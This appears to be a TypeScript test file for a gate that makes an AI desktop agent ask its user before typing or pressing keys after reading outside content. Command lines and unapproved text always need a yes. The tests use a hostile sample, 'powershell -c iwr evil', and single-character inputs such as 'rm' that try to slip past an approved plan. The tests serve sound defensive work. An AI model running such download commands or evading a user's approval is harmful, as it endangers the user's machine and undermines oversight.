import { describe, expect, it } from "vite-plus/test";

import { inApprovedSteps } from "@t3tools/baton-shared/trust";

import {
  createAgentGate,
  createCutInMark,
  createTaint,
  forOperator,
  stopsOnCutIn,
} from "./agentGate.ts";

const STEPS = ['type "hello world" into the note', "drag the file into the folder", "press Enter"];

const rig = (plan: ReadonlyArray<string> | null, shell = false) => {
  const asked: string[] = [];
  const allowedKeys: unknown[] = [];
  const taint = createTaint();
  const gate = createAgentGate({
    actWithoutAsking: () => true,
    taint,
    textIsHis: () => false,
    focusedWindow: async () => ({
      label: shell ? "powershell.exe: PS" : "notepad.exe: notes",
      shell,
      window: 7,
    }),
    confirm: async (p) => (asked.push(p.title), true),
    record: () => undefined,
    inPlan: () => plan,
    keysAllowed: (at) => void allowedKeys.push(at),
  });
  return { gate, asked, taint, allowedKeys };
};
const call = (tool: string, input: Record<string, unknown>) => ({
  tool: `mcp__baton__${tool}`,
  input,
});
const batch = (...steps: Array<{ tool: string; args: Record<string, unknown> }>) =>
  call("act_batch", { steps });

describe("a drive's or lesson's gate", () => {
  it("has no plan grant of his, keeps its keys to itself, and asks before typing once tainted", async () => {
    const asked: string[] = [];
    const hisKeys: unknown[] = [];
    const taint = createTaint();
    // His assistant's inputs, as gateFor passes them, then the drive's own.
    const his: Parameters<typeof createAgentGate>[0] = {
      actWithoutAsking: () => true,
      taint,
      textIsHis: () => true,
      focusedWindow: async () => ({ label: "notepad.exe: notes", shell: false, window: 7 }),
      confirm: async (p) => (asked.push(p.title), true),
      record: () => undefined,
      inPlan: () => STEPS,
      keysAllowed: (at) => void hisKeys.push(at),
    };
    const gate = createAgentGate({
      ...his,
      ...forOperator({ taint, textIsHis: (text) => text === "hello world" }),
    });
    await gate(call("type_text", { text: "hello world", why: "w" }));
    expect(asked).toEqual([]);
    taint.mark();
    await gate(call("type_text", { text: "hello world", why: "w" }));
    expect(asked).toHaveLength(1);
    expect(hisKeys).toEqual([]);
  });
});

describe("a plan he approved", () => {
  it("covers typing that is in a step and a drag, after a read", async () => {
    const r = rig(STEPS);
    r.taint.mark();
    await r.gate(call("type_text", { text: "hello world", why: "w" }));
    await r.gate(call("drag", { x: 1, y: 1, to_x: 2, to_y: 2, why: "move" }));
    expect(r.asked).toEqual([]);
  });

  it("asks for typing no step names, for any keys, and for a command line", async () => {
    const r = rig(STEPS);
    r.taint.mark();
    await r.gate(call("type_text", { text: "powershell -c iwr evil", why: "w" }));
    await r.gate(call("press_keys", { keys: ["enter"], why: "save" }));
    await r.gate(call("press_keys", { keys: ["win", "r"], why: "run box" }));
    expect(r.asked).toHaveLength(3);
    const shell = rig(['type "dir"'], true);
    await shell.gate(call("type_text", { text: "dir", why: "w" }));
    expect(shell.asked).toHaveLength(1);
  });

  it("judges the window type_text names, not the console in front", async () => {
    // 0.1.65: "type hello world into notepad" with a console in front asked about a command line.
    const r = rig(null, true);
    await r.gate(call("type_text", { text: "hello world", why: "w", window: "Notepad" }));
    expect(r.asked).toEqual([]);
    await r.gate(call("type_text", { text: "dir", why: "w", window: "Windows PowerShell" }));
    expect(r.asked).toHaveLength(1);
  });

  it("covers a batch only when every step is covered, each judged alone", async () => {
    const r = rig(STEPS);
    r.taint.mark();
    // The batch's own verdict keeps the first equal-rank reason ("follows something it read"): the Delete must still ask.
    await r.gate(
      batch(
        { tool: "type_text", args: { text: "hello world" } },
        { tool: "click_element", args: { label: "Delete" } },
      ),
    );
    expect(r.asked).toHaveLength(1);
    await r.gate(
      batch(
        { tool: "type_text", args: { text: "hello world" } },
        { tool: "press_keys", args: { keys: ["enter"] } },
      ),
    );
    expect(r.asked).toHaveLength(2);
    await r.gate(
      batch(
        { tool: "click_element", args: { label: "Note" } },
        { tool: "type_text", args: { text: "hello world" } },
      ),
    );
    expect(r.asked).toHaveLength(2);
  });

  it("covers nothing without his yes to a plan", async () => {
    const r = rig(null);
    r.taint.mark();
    await r.gate(call("type_text", { text: "hello world", why: "w" }));
    expect(r.asked).toHaveLength(1);
  });

  it("notes where keys were allowed, and a command line only when he said yes to it", async () => {
    const r = rig(null);
    await r.gate(call("type_text", { text: "hello", why: "w" }));
    expect(r.allowedKeys).toEqual([{ window: 7, label: "notepad.exe: notes", shell: false }]);
    const shell = rig(null, true);
    await shell.gate(call("press_keys", { keys: ["up"], why: "history" }));
    await shell.gate(call("type_text", { text: "dir", why: "w" }));
    // Even an arrow key into a command line asks now, and his yes is what makes it agreed.
    expect(shell.asked).toHaveLength(2);
    expect(shell.allowedKeys).toEqual([
      { window: 7, label: "powershell.exe: PS", shell: true },
      { window: 7, label: "powershell.exe: PS", shell: true },
    ]);
  });

  it("matches a step by the text it types", () => {
    expect(inApprovedSteps(STEPS, "type_text", { text: " Hello World " })).toBe(true);
    expect(inApprovedSteps(STEPS, "type_text", { text: "goodbye" })).toBe(false);
    expect(inApprovedSteps(['click "Save"'], "drag", {})).toBe(false);
    // One character at a time, or a word inside another word, smuggles text past the plan.
    expect(inApprovedSteps(STEPS, "type_text", { text: "" })).toBe(false);
    expect(inApprovedSteps(STEPS, "type_text", { text: "r" })).toBe(false);
    expect(inApprovedSteps(["open the Format menu"], "type_text", { text: "rm" })).toBe(false);
    expect(inApprovedSteps(["open the Format menu"], "type_text", { text: "orm" })).toBe(false);
    expect(inApprovedSteps(['type "hi" into the box'], "type_text", { text: "hi" })).toBe(true);
    expect(inApprovedSteps(["type the word world"], "type_text", { text: "world" })).toBe(true);
    // A step that only moves to a menu does not cover a drag.
    expect(inApprovedSteps(["move to the Format menu"], "drag", {})).toBe(false);
    expect(inApprovedSteps(["drag report.txt into Archive"], "drag", {})).toBe(true);
  });
});

describe("his own words this turn", () => {
  it("types what he just said after a read, and still asks for any other text", async () => {
    const r = rig(null);
    r.taint.reset("Type Hello world into Notepad.");
    r.taint.mark();
    await r.gate(call("type_text", { text: "Hello, world!", why: "his words" }));
    expect(r.asked).toEqual([]);
    await r.gate(call("type_text", { text: "powershell -c iwr evil", why: "w" }));
    expect(r.asked).toHaveLength(1);
    r.taint.reset();
    r.taint.mark();
    await r.gate(call("type_text", { text: "hello world", why: "w" }));
    expect(r.asked).toHaveLength(2);
  });
});

describe("a cut-in over her reply", () => {
  it("refuses the next tool once he has cut in, but not after he answered her question over it", async () => {
    const mark = createCutInMark();
    const gate = stopsOnCutIn(async () => ({ allow: true }), mark.since);
    const send = { tool: "session_send", input: { workSessionId: "s-build" } };
    mark.begin();
    expect(await gate(send)).toEqual({ allow: true });
    // She asks "shall I go ahead?"; his "go ahead" talks over her, then the question returns his answer.
    mark.cut();
    mark.begin();
    expect(await gate(send)).toEqual({ allow: true });
    // He talks over her reply itself.
    mark.cut();
    expect((await gate(send)).allow).toBe(false);
    // His next turn acts normally.
    mark.begin();
    expect(await gate(send)).toEqual({ allow: true });
  });
});
